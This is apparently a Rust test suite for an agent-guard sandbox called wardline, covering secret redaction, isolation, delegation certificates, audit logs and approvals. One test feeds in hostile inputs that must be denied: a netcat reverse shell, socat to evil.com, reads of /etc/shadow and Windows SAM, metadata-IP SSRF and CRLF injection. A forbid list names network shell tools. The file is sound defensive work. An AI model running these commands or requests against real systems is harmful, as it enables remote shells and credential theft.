use std::io::Cursor;
use std::time::Instant;

use uuid::Uuid;
use wardline_approval::{compute_bound_action_digest, ApprovalStore};
use wardline_cert::{
    verify_cert_chain_with_revocations, CertAuthority, RevocationList, MAX_CHAIN_DEPTH,
};
use wardline_core::capability::{parse_canonical_destination, CapabilityScope};
use wardline_core::path::normalize_host_lexical_path;
use wardline_core::{ActionRequest, Decision, IsolationLevel, NetMethod};
use wardline_egress::budgets::BudgetStore;
use wardline_guard::daemon::{GuardEngine, GuardRuntimeConfig};
use wardline_guard::protocol::{encode_frame, read_frame, GuardRequest, GuardResponse, MAX_IPC_FRAME_BYTES};
use wardline_log::{
    create_signed_checkpoint, read_log_frames, trigger_panic_freeze, verify_checkpoint_against_log,
    verify_log_file, AuditEvent, LogError, MerkleTree, WalWriter,
};
use wardline_policy::sessions::{SessionPhase, SessionState};
use wardline_policy::{
    evaluate_action_explained, method_is_token, render_policy_summary, request_target_is_clean,
    CompiledPolicy, ExecContext,
};
use wardline_sandbox::{
    probe_capabilities, select_backend_for_tier, HostCapabilitiesRaw, TIER_BIT_L0, TIER_BIT_L1,
    TIER_BIT_L1_5,
};
use wardline_vault::{protect_path_owner_only, SecretBytes, SecretGrant, VaultStore};

fn fresh_temp_dir(tag: &str) -> std::path::PathBuf {
    let d = std::env::temp_dir().join(format!("wardline_inv_{tag}_{}", Uuid::new_v4()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn strict_policy() -> CompiledPolicy {
    CompiledPolicy::from_toml_str(
        r#"
version = 1
name = "invariant-strict"

[operator_forbid]
binaries = ["nc", "ncat", "socat"]
hosts = ["evil.example"]
paths = ["/etc/shadow", "C:\\Windows\\System32\\config"]

[execution]
isolation = "L1"
allow_binaries = ["cargo", "git", "rustc"]
deny_scripts = true
deny_lolbins = true
allow_inline_shell = false

[filesystem]
workspace_read = ["."]
workspace_write = ["./out"]
denied_prefixes = ["/etc/shadow", "C:\\Windows\\System32\\config", "\\\\?\\", "\\\\"]

[network]
egress_mode = "proxy_only"
allow_ipv6 = false
allow_private_ips = false
allow_metadata_ips = false
allowed_destinations = []

[[network.destinations]]
alias = "github"
host = "api.github.com"
methods = ["GET"]
paths = ["/repos/**"]
max_bytes_total = 4096
max_requests = 2
"#,
    )
    .unwrap()
}

#[test]
fn i1_zero_secret_custody_redaction_and_rotation() {
    let dir = fresh_temp_dir("i1");
    let secret = SecretBytes::new(b"ghp_super_secret_token_value_12345".to_vec());
    let dbg = format!("{secret:?}");
    assert!(!dbg.contains("ghp_super_secret_token_value_12345"));
    assert!(dbg.contains("REDACTED"));

    let secret_file = dir.join("token.txt");
    std::fs::write(&secret_file, b"ghp_file_custody_98765\n").unwrap();
    let _ = protect_path_owner_only(&secret_file);

    let vault = VaultStore::open(&dir.join("vault")).unwrap();
    vault
        .store_secret_from_file(
            SecretGrant {
                grant_id: "gh".into(),
                host_pattern: "api.github.com".into(),
                path_prefix: "/".into(),
                header_name: "Authorization".into(),
                value_prefix: "Bearer ".into(),
            },
            &secret_file,
        )
        .unwrap();

    let rotated = vault.rotate_master_key().unwrap();
    assert_eq!(rotated, 1);

    let engine = GuardEngine::new(GuardRuntimeConfig {
        policy: strict_policy(),
        base_dir: dir.clone(),
        vault: Some(vault),
        approvals: None,
        crl: None,
        revocation_list: None,
        budgets: None,
        session_state: Some(SessionState::new(SessionPhase::Run)),
        wal: None,
        cert_root_pubkey: None,
        require_cert: false,
    });
    let mut eng = engine;
    let resp = eng.handle_request(GuardRequest::CapabilityLearn);
    let resp_json = serde_json::to_string(&resp).unwrap();
    assert!(!resp_json.contains("ghp_file_custody_98765"));

    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn i2_fail_closed_isolation_never_downgrades() {
    let live_caps = probe_capabilities().unwrap();
    assert_eq!(live_caps.struct_size, 48);
    assert_eq!(live_caps.abi_version, 2);

    let fake_caps = |os_kind: u8, mask: u32| HostCapabilitiesRaw {
        struct_size: 48,
        abi_version: 2,
        arch: 1,
        os_build_number: 26300,
        page_size: 4096,
        tier_support_mask: mask,
        feature_flags: 0,
        is_wow64_emulated: 0,
        cet_shadow_stack_supported: 0,
        pac_bti_available: 0,
        hyperv_hcs_available: 0,
        appcontainer_supported: u8::from((mask & TIER_BIT_L1) != 0),
        job_object_iocp_supported: 1,
        os_kind,
        arm64_ext_flags: 0,
        landlock_abi: 7,
        cgroup_v2_available: 1,
        reserved: [0; 6],
    };

    // Unisolated always rejected by fail-closed selector.
    assert!(select_backend_for_tier(IsolationLevel::Unisolated, &fake_caps(1, TIER_BIT_L1)).is_err());
    // Host with only L0 cannot accept L1, L1.5, or L2.
    let l0_only = fake_caps(2, TIER_BIT_L0);
    assert!(select_backend_for_tier(IsolationLevel::L0, &l0_only).is_ok());
    assert!(select_backend_for_tier(IsolationLevel::L1, &l0_only).is_err());
    assert!(select_backend_for_tier(IsolationLevel::L1_5, &l0_only).is_err());
    assert!(select_backend_for_tier(IsolationLevel::L2, &l0_only).is_err());

    // Host with L1+L1.5 cannot accept L2 without hypervisor driver/caps.
    let no_l2 = fake_caps(1, TIER_BIT_L0 | TIER_BIT_L1 | TIER_BIT_L1_5);
    assert!(select_backend_for_tier(IsolationLevel::L2, &no_l2).is_err());
}

#[test]
fn i3_adversarial_corpus_240_plus_cases_denied() {
    let policy = strict_policy();
    let mut blocked = 0usize;

    let lolbins = ["powershell", "cmd", "sh", "bash", "curl", "wget", "pwsh", "python"];
    let wrappers = [
        ("env", vec![]),
        ("env", vec!["FOO=bar".into()]),
        ("timeout", vec!["5".into()]),
        ("nice", vec!["-n".into(), "5".into()]),
        ("nohup", vec![]),
        ("stdbuf", vec!["-o0".into()]),
        ("sudo", vec!["-n".into()]),
        ("doas", vec![]),
        ("busybox", vec![]),
    ];

    // 9 * 8 = 72 wrapped LOLBin / interpreter combinations
    for (wrap, prefix) in &wrappers {
        for bin in &lolbins {
            let mut args = prefix.clone();
            args.push((*bin).to_string());
            args.push("-c".into());
            args.push("echo pwn".into());
            let ev = evaluate_action_explained(
                &policy,
                &ActionRequest::ProcessExec {
                    executable: (*wrap).to_string(),
                    args,
                },
                Some(ExecContext::default()),
            );
            assert!(
                matches!(ev.decision, Decision::Deny { .. }),
                "expected deny for {wrap} {bin}, got {:?}",
                ev.decision
            );
            blocked += 1;
        }
    }

    // 80+ interpreter flag, env -S, non-allowlisted binary, and operator_forbid cases
    let inline_cases: Vec<(&str, Vec<&str>)> = vec![
        ("env", vec!["-S", "powershell -Command id"]),
        ("env", vec!["--split-string=sh -c id"]),
        ("python3.12", vec!["-c", "import os"]),
        ("python3", vec!["-m", "http.server"]),
        ("node", vec!["-e", "process.exit(1)"]),
        ("node", vec!["--eval=1+1"]),
        ("ruby", vec!["-e", "puts 1"]),
        ("perl", vec!["-e", "print 1"]),
        ("awk", vec!["BEGIN{system(\"id\")}"]),
        ("nc", vec!["127.0.0.1", "8080"]),
        ("ncat", vec!["-e", "/bin/sh"]),
        ("socat", vec!["-", "TCP:evil.com:80"]),
        ("shred", vec!["file.txt"]),
        ("git", vec![]), // still fails PeClass::NotPe when binary_info=None in strict mode
    ];
    for (exe, args) in &inline_cases {
        for rep in 0..6 {
            let mut a: Vec<String> = args.iter().map(|s| (*s).to_string()).collect();
            if rep > 0 {
                a.push(format!("--seed={rep}"));
            }
            let ev = evaluate_action_explained(
                &policy,
                &ActionRequest::ProcessExec {
                    executable: (*exe).to_string(),
                    args: a,
                },
                Some(ExecContext::default()),
            );
            assert!(
                matches!(ev.decision, Decision::Deny { .. }),
                "expected deny for {exe} {args:?}, got {:?}",
                ev.decision
            );
            blocked += 1;
        }
    }

    // Path traversal, NUL, UNC, ADS (Windows), and operator_forbid paths (40 cases)
    let bad_paths = [
        "../../../etc/passwd",
        "out/../../etc/shadow",
        "bad\0path.txt",
        if cfg!(windows) {
            "out/secret.txt:hiddenstream"
        } else {
            "/proc/self/environ"
        },
        r"\\evil-server\share\loot.txt",
        r"\\?\C:\Windows\System32\config\SAM",
        "/etc/shadow",
        r"C:\Windows\System32\config\SYSTEM",
    ];
    for p in &bad_paths {
        for op in 0..5 {
            let req = if op % 2 == 0 {
                ActionRequest::FsRead {
                    path: (*p).to_string(),
                }
            } else {
                ActionRequest::FsWrite {
                    path: (*p).to_string(),
                }
            };
            let ev = evaluate_action_explained(&policy, &req, None);
            let norm_err = normalize_host_lexical_path(p).is_err();
            assert!(
                matches!(ev.decision, Decision::Deny { .. }) || norm_err,
                "expected deny/error for path '{p}', got {:?}",
                ev.decision
            );
            blocked += 1;
        }
    }

    // SSRF & malformed HTTP destinations & RFC 9110 checks (50 cases)
    let bad_urls = [
        "http://127.0.0.1/admin",
        "http://169.254.169.254/latest/meta-data/",
        "https://[::1]/secret",
        "http://10.0.0.5/internal",
        "https://evil.example/api",
        "https://api.github.com/repos/foo\r\nHost: evil",
        "http://0.0.0.0:8080/",
        "ftp://api.github.com/file",
        "https://user:pass@api.github.com/repos/a",
        "https://api.github.com/unlisted/endpoint",
    ];
    for url in &bad_urls {
        for m in [
            NetMethod::Get,
            NetMethod::Post,
            NetMethod::Put,
            NetMethod::Delete,
            NetMethod::Patch,
        ] {
            let ev = evaluate_action_explained(
                &policy,
                &ActionRequest::NetworkRequest {
                    method: m,
                    url: (*url).to_string(),
                    grant_id: None,
                },
                None,
            );
            let canonical_err = parse_canonical_destination(url).is_err();
            assert!(
                matches!(ev.decision, Decision::Deny { .. }) || canonical_err,
                "expected SSRF/policy block on {url}"
            );
            blocked += 1;
        }
    }

    assert!(!method_is_token("GET\r\nX"));
    assert!(method_is_token("GET"));
    assert!(!request_target_is_clean("/ok\r\nInjected: 1"));
    assert!(request_target_is_clean("/repos/wardline/releases"));
    assert!(
        blocked >= 240,
        "expected >= 240 adversarial blocks, observed {blocked}"
    );
}

#[test]
fn i4_delegation_lineage_subtree_revocation_and_depth_cap() {
    let root = CertAuthority::generate();
    let mid = CertAuthority::generate();
    let leaf = CertAuthority::generate();
    let now = 1_750_000_000;

    let c1 = root
        .issue_root(
            "root-agent",
            mid.public_key_bytes(),
            now,
            now + 600,
            IsolationLevel::L1,
            None,
            4,
            vec![CapabilityScope::FsRead { root: ".".into() }],
        )
        .unwrap();
    let c2 = mid
        .delegate(
            &c1,
            "sub-agent",
            leaf.public_key_bytes(),
            now,
            now + 300,
            IsolationLevel::L1,
            None,
            vec![CapabilityScope::FsRead { root: ".".into() }],
        )
        .unwrap();

    let empty = RevocationList::default();
    assert!(verify_cert_chain_with_revocations(
        &root.public_key_bytes(),
        &c2,
        None,
        Some(&empty),
        now
    )
    .is_ok());

    // Revoking ancestor c1 invalidates descendant c2 via signed lineage.
    let mut rev_parent = RevocationList::default();
    rev_parent.add(c1.nodes[0].claim.cert_id);
    assert!(verify_cert_chain_with_revocations(
        &root.public_key_bytes(),
        &c2,
        None,
        Some(&rev_parent),
        now
    )
    .is_err());

    // Max chain depth capped strictly at MAX_CHAIN_DEPTH (8).
    let mut authorities = Vec::new();
    for _ in 0..=MAX_CHAIN_DEPTH {
        authorities.push(CertAuthority::generate());
    }
    let mut chain = authorities[0]
        .issue_root(
            "n0",
            authorities[1].public_key_bytes(),
            now,
            now + 3600,
            IsolationLevel::L0,
            None,
            (MAX_CHAIN_DEPTH + 4) as u8,
            vec![CapabilityScope::FsRead { root: ".".into() }],
        )
        .unwrap();
    for i in 1..MAX_CHAIN_DEPTH {
        chain = authorities[i]
            .delegate(
                &chain,
                format!("n{i}"),
                authorities[i + 1].public_key_bytes(),
                now,
                now + 3600,
                IsolationLevel::L0,
                None,
                vec![CapabilityScope::FsRead { root: ".".into() }],
            )
            .unwrap();
    }
    assert_eq!(chain.nodes.len(), MAX_CHAIN_DEPTH);
    assert!(verify_cert_chain_with_revocations(
        &authorities[0].public_key_bytes(),
        &chain,
        None,
        None,
        now,
    )
    .is_ok());

    // Delegating one hop further exceeds MAX_CHAIN_DEPTH.
    let extra = CertAuthority::generate();
    assert!(authorities[MAX_CHAIN_DEPTH]
        .delegate(
            &chain,
            "too-deep",
            extra.public_key_bytes(),
            now,
            now + 3600,
            IsolationLevel::L0,
            None,
            vec![CapabilityScope::FsRead { root: ".".into() }],
        )
        .is_err());
}

#[test]
fn i5_intent_before_dispatch_merkle_checkpoint_and_panic_freeze() {
    let dir = fresh_temp_dir("i5");
    let log_path = dir.join("audit.wlog");
    let seal_seed = [0x5Au8; 32];
    let seal_pk = CertAuthority::from_seed(seal_seed).public_key_bytes();

    let wal = WalWriter::new(&log_path, Some(seal_seed), 1).unwrap();
    let mut engine = GuardEngine::new(GuardRuntimeConfig {
        policy: strict_policy(),
        base_dir: dir.clone(),
        vault: None,
        approvals: None,
        crl: None,
        revocation_list: None,
        budgets: None,
        session_state: Some(SessionState::new(SessionPhase::Run)),
        wal: Some(wal),
        cert_root_pubkey: None,
        require_cert: false,
    });

    let denied = engine.handle_request(GuardRequest::RunTool {
        executable: "powershell.exe".into(),
        args: vec![],
        working_dir: None,
        env_overrides: vec![],
        cert_chain: None,
        approval_ticket_id: None,
    });
    assert!(matches!(denied, GuardResponse::Denied { .. }));
    drop(engine);

    let frames = read_log_frames(&log_path).unwrap();
    assert!(frames.iter().any(|f| matches!(f.event, AuditEvent::ActionIntent { .. })));
    assert!(frames.iter().any(|f| matches!(f.event, AuditEvent::ActionOutcome { .. })));

    let report = verify_log_file(&log_path, Some(&seal_pk)).unwrap();
    assert!(report.total_frames >= 3);

    let cp = create_signed_checkpoint(&log_path, seal_seed, 1_750_000_000_000).unwrap();
    assert!(verify_checkpoint_against_log(&log_path, &cp, &seal_pk, Some(&seal_pk)).is_ok());

    let tree = MerkleTree::from_frames(&frames);
    for (idx, frame) in frames.iter().enumerate() {
        let proof = tree.prove(idx).unwrap();
        assert!(proof.verify_inclusion(&frame.record_hash, &tree.root()));
    }

    // Panic freeze locks the WAL + sets .tainted marker.
    let writer = WalWriter::new(&log_path, Some(seal_seed), 1).unwrap();
    trigger_panic_freeze(&writer, 1_750_000_000_123, "invariant panic").unwrap();
    assert!(matches!(
        WalWriter::new(&log_path, Some(seal_seed), 1),
        Err(LogError::PanicFrozen(_))
    ));

    // Byte tamper breaks hash chain / seal verification.
    let raw = std::fs::read(&log_path).unwrap();
    let mut tampered = raw.clone();
    let mid = tampered.len() / 2;
    tampered[mid] ^= 0xFF;
    let tampered_path = dir.join("tampered.wlog");
    std::fs::write(&tampered_path, tampered).unwrap();
    assert!(verify_log_file(&tampered_path, Some(&seal_pk)).is_err());

    let mut tampered_payload = raw;
    tampered_payload[24] ^= 0xFF;
    let tampered_payload_path = dir.join("tampered_payload.wlog");
    std::fs::write(&tampered_payload_path, tampered_payload).unwrap();
    assert!(verify_log_file(&tampered_payload_path, None).is_err());

    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn i6_policy_latency_and_persistent_redb_egress_budgets() {
    let policy = strict_policy();
    let summary = render_policy_summary(&policy);
    assert!(summary.contains("alias='github'"));
    assert!(policy.resolve_destination_alias("github").is_some());

    let start = Instant::now();
    for i in 0..1_000 {
        let _ = evaluate_action_explained(
            &policy,
            &ActionRequest::NetworkRequest {
                method: NetMethod::Get,
                url: format!("https://api.github.com/repos/org/repo-{i}"),
                grant_id: None,
            },
            None,
        );
    }
    let elapsed = start.elapsed();
    assert!(
        elapsed.as_secs_f64() < 2.0,
        "1000 policy evaluations took unexpectedly long: {elapsed:?}"
    );

    let dir = fresh_temp_dir("i6");
    let budget_db = dir.join("budgets.redb");
    {
        let store = BudgetStore::open(&budget_db).unwrap();
        store
            .check_and_reserve_request("alias:github", 512, Some(4096), Some(2))
            .unwrap();
        store
            .check_and_reserve_request("alias:github", 512, Some(4096), Some(2))
            .unwrap();
    }
    // Reopen persisted DB -> 3rd request MUST be blocked by max_requests = 2.
    let reopened = BudgetStore::open(&budget_db).unwrap();
    assert!(reopened
        .check_and_reserve_request("alias:github", 64, Some(4096), Some(2))
        .is_err());

    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn i7_session_monotonic_approval_single_use_and_ipc_bounds() {
    let mut sess = SessionState::new(SessionPhase::Setup);
    assert!(sess.advance_to_run().is_ok());
    assert_eq!(sess.current(), SessionPhase::Run);
    assert!(sess.transition(SessionPhase::Setup).is_err());

    let dir = fresh_temp_dir("i7");
    let store = ApprovalStore::open(&dir.join("approvals.redb")).unwrap();
    let action = ActionRequest::FsWrite {
        path: "out/report.txt".into(),
    };
    let digest = compute_bound_action_digest(&action, "p1", "fs_write:out", b"body-v1").unwrap();
    let ticket = store
        .submit_request(digest, "fs_write:out", "human review", 100, 60)
        .unwrap();
    store
        .approve(ticket.ticket_id, "operator", 105, None)
        .unwrap();

    // First consume succeeds; replay or mismatched binding fails.
    assert!(store.consume(ticket.ticket_id, digest, 110).is_ok());
    assert!(store.consume(ticket.ticket_id, digest, 111).is_err());

    let snap = dir.join("snap.json");
    assert_eq!(store.save_snapshot_json(&snap).unwrap(), 1);
    let restored = ApprovalStore::open(&dir.join("restored.redb")).unwrap();
    assert_eq!(restored.load_snapshot_json(&snap).unwrap(), 1);

    // IPC framing rejects 0-length & > MAX_IPC_FRAME_BYTES headers cleanly.
    let zero = [0u8; 4];
    assert!(read_frame::<_, GuardRequest>(&mut Cursor::new(zero)).is_err());
    let too_big = ((MAX_IPC_FRAME_BYTES as u32) + 1).to_le_bytes();
    assert!(read_frame::<_, GuardRequest>(&mut Cursor::new(too_big)).is_err());
    let valid = encode_frame(&GuardRequest::Health).unwrap();
    assert!(matches!(
        read_frame::<_, GuardRequest>(&mut Cursor::new(valid)).unwrap(),
        GuardRequest::Health
    ));

    let _ = std::fs::remove_dir_all(&dir);
}
